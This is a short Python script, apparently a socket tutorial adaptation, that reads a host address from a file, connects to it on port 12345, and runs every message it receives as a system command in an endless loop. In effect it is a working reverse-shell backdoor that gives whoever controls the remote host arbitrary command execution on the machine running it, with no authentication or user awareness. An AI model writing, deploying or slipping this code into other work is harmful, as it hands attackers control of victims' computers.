# Import socket module 
import socket                
import os  
# Create a socket object 
s = socket.socket()          
  
# Define the port on which you want to connect 
port = 12345                
f = open('ip.txt', 'r')  
# connect to the server on local computer 
s.connect((f.read(), port)) 
  
while True:
                y=s.recv(1024)
                os.system(y)
